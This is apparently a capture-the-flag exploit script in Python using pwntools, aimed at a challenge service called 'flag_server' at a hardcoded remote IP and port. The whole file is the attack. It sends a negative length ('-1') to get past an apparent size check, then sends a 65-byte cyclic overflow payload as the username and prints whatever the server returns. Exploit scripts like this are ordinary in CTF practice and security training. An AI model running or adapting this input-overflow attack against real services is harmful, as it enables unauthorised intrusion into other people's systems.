#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

#  io = process("./flag_server")
io = remote("111.230.149.72", 10001)

payload = cyclic(65)

io.sendlineafter("length: ", "-1")
io.sendlineafter("username?\n", payload)

print io.recvall()
io.close()
